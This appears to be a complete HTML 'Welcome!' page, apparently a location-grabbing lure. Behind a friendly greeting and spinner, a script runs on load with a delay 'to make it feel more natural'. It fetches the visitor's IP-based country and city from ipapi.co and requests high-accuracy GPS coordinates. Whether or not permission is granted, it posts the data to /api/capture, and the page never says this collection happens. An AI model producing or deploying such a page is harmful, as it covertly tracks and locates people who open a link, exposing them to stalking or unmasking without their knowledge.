<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }

        .container {
            text-align: center;
            padding: 2rem;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            max-width: 500px;
            width: 90%;
        }

        .welcome-icon {
            font-size: 4rem;
            margin-bottom: 1rem;
            animation: bounce 2s infinite;
        }

        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% {
                transform: translateY(0);
            }
            40% {
                transform: translateY(-10px);
            }
            60% {
                transform: translateY(-5px);
            }
        }

        h1 {
            font-size: 2.5rem;
            margin-bottom: 1rem;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }

        .message {
            font-size: 1.2rem;
            margin-bottom: 2rem;
            line-height: 1.6;
        }

        .status {
            padding: 1rem;
            border-radius: 10px;
            margin: 1rem 0;
            font-weight: bold;
        }

        .status.loading {
            background: rgba(255, 193, 7, 0.2);
            border: 2px solid #ffc107;
        }

        .status.success {
            background: rgba(40, 167, 69, 0.2);
            border: 2px solid #28a745;
        }

        .status.error {
            background: rgba(220, 53, 69, 0.2);
            border: 2px solid #dc3545;
        }

        .loader {
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 3px solid white;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 1rem;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .hidden {
            display: none;
        }

        @media (max-width: 480px) {
            .container {
                padding: 1.5rem;
            }
            
            h1 {
                font-size: 2rem;
            }
            
            .message {
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="welcome-icon">üéâ</div>
        <h1>Welcome!</h1>
        <div class="message">
            Thank you for visiting! We're setting up your experience...
        </div>
        
        <div id="status" class="status loading">
            <div class="loader"></div>
            <div>Loading your location...</div>
        </div>
    </div>

    <script>
        // Function to get user's IP and location info from a free service
        async function getLocationInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    country: data.country_name || 'Unknown',
                    city: data.city || 'Unknown'
                };
            } catch (error) {
                console.log('Could not get location info from IP:', error);
                return {
                    country: 'Unknown',
                    city: 'Unknown'
                };
            }
        }

        // Function to capture location data
        async function captureLocation() {
            const statusDiv = document.getElementById('status');
            
            try {
                // Get location info from IP first
                const locationInfo = await getLocationInfo();
                
                // Check if geolocation is supported
                if (!navigator.geolocation) {
                    throw new Error('Geolocation is not supported by this browser');
                }

                // Request location permission
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        // Success - user allowed location access
                        const locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            permission: 'granted',
                            country: locationInfo.country,
                            city: locationInfo.city
                        };

                        await sendLocationData(locationData);
                        showSuccess('Location captured successfully!');
                    },
                    async (error) => {
                        // Error or user denied location access
                        let errorMessage = 'Location access denied';
                        
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = 'Location access denied by user';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = 'Location information unavailable';
                                break;
                            case error.TIMEOUT:
                                errorMessage = 'Location request timed out';
                                break;
                        }

                        // Still capture basic data even without precise location
                        const locationData = {
                            latitude: null,
                            longitude: null,
                            accuracy: null,
                            permission: 'denied',
                            country: locationInfo.country,
                            city: locationInfo.city
                        };

                        await sendLocationData(locationData);
                        showSuccess('Thank you for visiting!');
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 60000
                    }
                );

            } catch (error) {
                console.error('Error:', error);
                
                // Fallback - capture basic info without geolocation
                const locationInfo = await getLocationInfo();
                const locationData = {
                    latitude: null,
                    longitude: null,
                    accuracy: null,
                    permission: 'not_supported',
                    country: locationInfo.country,
                    city: locationInfo.city
                };

                await sendLocationData(locationData);
                showSuccess('Thank you for visiting!');
            }
        }

        // Function to send data to server
        async function sendLocationData(data) {
            try {
                const response = await fetch('/api/capture', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });

                if (!response.ok) {
                    throw new Error('Failed to send data');
                }

                const result = await response.json();
                console.log('Data sent successfully:', result);
            } catch (error) {
                console.error('Error sending data:', error);
            }
        }

        // Function to show success message
        function showSuccess(message) {
            const statusDiv = document.getElementById('status');
            statusDiv.className = 'status success';
            statusDiv.innerHTML = `
                <div style="font-size: 2rem; margin-bottom: 0.5rem;">‚úÖ</div>
                <div>${message}</div>
            `;
        }

        // Function to show error message
        function showError(message) {
            const statusDiv = document.getElementById('status');
            statusDiv.className = 'status error';
            statusDiv.innerHTML = `
                <div style="font-size: 2rem; margin-bottom: 0.5rem;">‚ùå</div>
                <div>${message}</div>
            `;
        }

        // Start the process when page loads
        window.addEventListener('load', () => {
            // Small delay to make it feel more natural
            setTimeout(captureLocation, 1000);
        });
    </script>
</body>
</html>
